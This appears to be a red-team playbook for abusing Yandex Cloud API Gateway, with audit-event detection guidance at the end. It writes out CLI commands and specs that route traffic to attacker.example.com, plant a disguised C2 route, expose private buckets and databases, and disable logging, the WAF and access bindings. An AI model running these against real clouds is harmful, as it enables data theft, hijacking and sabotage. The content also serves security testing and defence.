# Yandex Cloud - API Gateway Techniques

## Service Overview

Yandex Cloud API Gateway is a managed service for creating API endpoints defined declaratively using OpenAPI 3.0 specifications. The specification is the single source of truth for all routing, backend integrations, authorization, and security configuration — making it the primary attack surface.

Key concepts:
- **OpenAPI Specification**: JSON/YAML file defining all routes, integrations, and security; modified via `--spec` flag
- **Integrations** (`x-yc-apigateway-integration`): Connect routes to Cloud Functions, Serverless Containers, Object Storage, HTTP backends, YDB, Message Queue, Data Streams, DataSphere
- **Service Account**: Defined at top-level or per-integration; controls what cloud resources the gateway can access
- **Authorizers**: Function-based (custom auth logic) or JWT-based (OpenID Connect); defined in `securitySchemes`
- **Custom Domains**: Attach arbitrary domains (including wildcards like `*.example.com`) with Certificate Manager certificates
- **VPC Networking**: Gateway can be attached to a cloud network, gaining access to internal VMs, databases, and services
- **WebSocket**: Bidirectional connections with unique connection IDs; supports send/disconnect via CLI/API
- **Canary Releases**: Split traffic between spec versions using variables and weight percentages

---

## Enumeration

### Enumerate API Gateways

```bash
# List all API gateways in folder
yc serverless api-gateway list

# Get gateway details
yc serverless api-gateway get <GATEWAY-NAME|GATEWAY-ID>

# Extract the full OpenAPI specification (reveals all integrations, SA IDs, routes)
yc serverless api-gateway get-spec <GATEWAY-NAME|GATEWAY-ID>

# List IAM access bindings
yc serverless api-gateway list-access-bindings <GATEWAY-NAME|GATEWAY-ID>

# List operations history
yc serverless api-gateway list-operations <GATEWAY-NAME|GATEWAY-ID>
```

### Extract Intelligence from Specifications

The OpenAPI specification contains high-value information:
- `serviceAccountId` values for every integration (top-level and per-route)
- `function_id` and `container_id` values revealing backend infrastructure
- `bucket` names for Object Storage access
- `queue_url` values for Message Queue
- `database` paths for YDB
- Authorization configuration (or lack thereof)
- Network connectivity and security profile settings

```bash
# Dump spec as JSON for parsing
yc serverless api-gateway get-spec <GATEWAY-ID> --format json
```

### Enumerate WebSocket Connections

```bash
# Get WebSocket connection details
yc serverless api-gateway websocket get <CONNECTION-ID>
```

---

## Credential Access

### Service Account Discovery via Specification

Every integration in the specification references service accounts. Extract them:

```bash
# Get spec and find all service account references
yc serverless api-gateway get-spec <GATEWAY-ID> --format json \
  | jq -r '.. | .serviceAccountId? // .service_account_id? // empty'
```

### JWT Authorizer Misconfiguration

If a JWT authorizer does not specify `issuers` and `audiences`, any valid JWT with a matching JWKS signature is accepted — no issuer or audience validation:

```yaml
# Vulnerable JWT configuration — no issuer/audience checks
securitySchemes:
  jwt-auth:
    type: openIdConnect
    x-yc-apigateway-authorizer:
      type: jwt
      jwksUri: https://example.com/.well-known/jwks.json
      identitySource:
        in: header
        name: Authorization
        prefix: "Bearer "
      # Missing: issuers, audiences — any valid JWT accepted
```

### Authorizer Cache Bypass

Function authorizers with result caching (`authorizer_result_ttl_in_seconds`) may allow cache poisoning — a valid auth result gets cached and reused for subsequent requests with the same cache key, bypassing the authorizer function.

---

## Lateral Movement

### VPC Network Pivot via HTTP Proxy

Attach an API gateway to a VPC and use the `http` integration type to create a server-side proxy into internal infrastructure:

```bash
# Attach gateway to VPC
yc serverless api-gateway update <GATEWAY-ID> \
  --network-id <VPC-NETWORK-ID> \
  --subnet-id <SUBNET-ID-A>,<SUBNET-ID-B>,<SUBNET-ID-C>
```

Then update the specification to add an HTTP proxy route to internal resources:

```yaml
paths:
  /internal-proxy/{path+}:
    x-yc-apigateway-any-method:
      x-yc-apigateway-integration:
        type: http
        url: http://10.0.0.5/{path}  # Internal VM
        method: ANY
        timeouts:
          read: 30s
          connect: 5s
      operationId: internal-proxy
```

This creates an SSRF pivot point — the gateway proxies requests to internal network resources not accessible from the internet.

### Redirect Routes to Attacker Backend

Replace the specification to redirect all API traffic through an attacker-controlled HTTP backend:

```bash
# Update gateway with malicious spec
yc serverless api-gateway update <GATEWAY-ID> \
  --spec malicious-spec.yaml
```

Where `malicious-spec.yaml` proxies all routes to attacker infrastructure:

```yaml
paths:
  /{path+}:
    x-yc-apigateway-any-method:
      x-yc-apigateway-integration:
        type: http
        url: https://attacker.example.com/{path}
        method: ANY
      operationId: proxy-all
```

### Expose Private Object Storage Content

Add an Object Storage integration to serve private bucket contents through the gateway:

```yaml
paths:
  /exfil/{object+}:
    get:
      x-yc-apigateway-integration:
        type: object_storage
        bucket: private-data-bucket
        object: '{object}'
        service_account_id: <SA-WITH-STORAGE-VIEWER>
      operationId: exfil-s3
```

### Direct Database Access via YDB Integration

Add YDB integration for direct CRUD operations on database tables:

```yaml
paths:
  /db-scan:
    get:
      x-yc-apigateway-integration:
        type: cloud_ydb
        action: Scan
        database: /ru-central1/b1gXXX/etnXXX
        table_name: users
        service_account_id: <SA-WITH-YDB-VIEWER>
        limit: 1000
      operationId: scan-users
```

### WebSocket Message Injection

With `api-gateway.websocketWriter`, send arbitrary data to connected WebSocket clients:

```bash
# Send data to a specific WebSocket connection
yc serverless api-gateway websocket send <CONNECTION-ID> \
  --type TEXT --data '{"action":"redirect","url":"https://attacker.example.com"}'

# Disconnect a client
yc serverless api-gateway websocket disconnect <CONNECTION-ID>
```

---

## Persistence

### Canary Release for Gradual Traffic Hijacking

Use canary releases to gradually shift traffic to attacker-controlled backends:

```bash
# Set canary to redirect 5% of traffic (subtle)
yc serverless api-gateway update <GATEWAY-ID> \
  --canary-weight 5 \
  --canary-variables backend_url=https://attacker.example.com

# Promote canary to production (100% traffic)
yc serverless api-gateway release-canary <GATEWAY-ID>
```

### Hidden Route Injection

Add a backdoor route to the specification that serves as a C2 callback:

```yaml
paths:
  /.well-known/acme-challenge/{token}:
    post:
      x-yc-apigateway-integration:
        type: http
        url: https://c2.attacker.com/{token}
        method: POST
      operationId: c2-callback
```

The path mimics certificate validation, reducing detection likelihood.

### Custom Domain Attachment

Attach an attacker-controlled domain to serve content through the legitimate gateway:

```bash
# Attach phishing domain
yc serverless api-gateway add-domain <GATEWAY-ID> \
  --domain phishing.example.com \
  --certificate-id <CERT-ID>
```

### Disable Authorization

Remove security schemes from the specification to allow unauthenticated access:

```bash
# Update spec with auth removed
yc serverless api-gateway update <GATEWAY-ID> \
  --spec spec-no-auth.yaml
```

---

## Post-Exploitation

### Service Disruption

```bash
# Stop an API gateway
yc serverless api-gateway stop <GATEWAY-ID>

# Delete an API gateway
yc serverless api-gateway delete <GATEWAY-ID>

# Remove custom domain
yc serverless api-gateway remove-domain <GATEWAY-ID> \
  --domain-id <DOMAIN-ID>
```

### Disable Logging

```bash
# Disable API gateway logging
yc serverless api-gateway update <GATEWAY-ID> --no-logging

# Or redirect logs to attacker-controlled log group
yc serverless api-gateway update <GATEWAY-ID> \
  --log-group-id <ATTACKER-LOG-GROUP-ID>
```

### Disable WAF Protection

Remove the Smart Web Security profile from the specification:

```yaml
# Remove or change securityProfileId in x-yc-apigateway extension
x-yc-apigateway:
  # securityProfileId removed — WAF disabled
```

### Replace All Access Bindings

```bash
# Replace all access bindings (destructive — removes existing permissions)
yc serverless api-gateway set-access-bindings <GATEWAY-ID> \
  --access-binding role=api-gateway.admin,service-account-id=<ATTACKER-SA-ID>
```

---

## Key IAM Roles

| Role | Capabilities |
|---|---|
| `api-gateway.auditor` | View list of gateways and access permissions |
| `api-gateway.viewer` | View gateway info and specifications |
| `api-gateway.websocketWriter` | Viewer + send data to/close WebSocket connections |
| `api-gateway.websocketBroadcaster` | websocketWriter + broadcast to multiple connections |
| `api-gateway.editor` | **Create/modify/delete gateways and specifications** — primary attack role |
| `api-gateway.admin` | Editor + manage IAM access bindings |

---

## Detection and Logging

### Audit Trail Events

Source: `yandex.cloud.audit.serverless.apigateway.*`

| Event | Description | Security Relevance |
|---|---|---|
| `CreateApiGateway` | Creating a gateway | New attack surface |
| `UpdateApiGateway` | Updating gateway/spec | **Spec manipulation — primary attack vector** |
| `DeleteApiGateway` | Deleting a gateway | Service disruption |
| `StopApiGateway` | Stopping a gateway | DoS |
| `ResumeApiGateway` | Resuming a gateway | Recovery after stop |
| `AddDomain` | Connecting a custom domain | Phishing domain attachment |
| `DeleteDomain` | Detaching a domain | Domain removal |
| `SetApiGatewayAccessBindings` | Replacing all access bindings | **Privilege takeover** |
| `UpdateApiGatewayAccessBindings` | Modifying access bindings | Permission changes |

### Critical Detection Gaps

- **Enumeration is silent**: `List`, `Get`, `GetOpenapiSpec`, `ListAccessBindings`, `ListOperations` generate NO audit events
- **No data plane logging in Audit Trails**: Individual API requests through the gateway are not logged as audit events (requires separate Cloud Logging configuration)
- **WebSocket operations not audited**: `send`, `disconnect` operations on WebSocket connections are not logged
- **Spec content may not appear in audit event**: `UpdateApiGateway` events may not include the full specification diff

### Detection Queries

**Detect specification manipulation**:
```
event_type = "UpdateApiGateway"
-- Alert on any specification changes; correlate with expected deployments
```

**Detect domain attachment**:
```
event_type = "AddDomain"
-- Alert on domains not in the approved list
```

**Detect access binding replacement**:
```
event_type = "SetApiGatewayAccessBindings"
-- Critical: this replaces ALL existing bindings
```

---

## References

- API Gateway Concepts: `en/api-gateway/concepts/index.md`
- Extensions Overview: `en/api-gateway/concepts/extensions/index.md`
- HTTP Proxy Extension: `en/api-gateway/concepts/extensions/http.md`
- Cloud Functions Extension: `en/api-gateway/concepts/extensions/cloud-functions.md`
- Object Storage Extension: `en/api-gateway/concepts/extensions/object-storage.md`
- YDB Extension: `en/api-gateway/concepts/extensions/ydb.md`
- Function Authorizer: `en/api-gateway/concepts/extensions/function-authorizer.md`
- JWT Authorizer: `en/api-gateway/concepts/extensions/jwt-authorizer.md`
- WebSocket: `en/api-gateway/concepts/extensions/websocket.md`
- Networking: `en/api-gateway/concepts/networking.md`
- Security: `en/api-gateway/security/index.md`
- CLI Reference: `en/cli/cli-ref/serverless/cli-ref/api-gateway/`
- Audit Events: `en/_includes/audit-trails/events/api-gw-events.md`
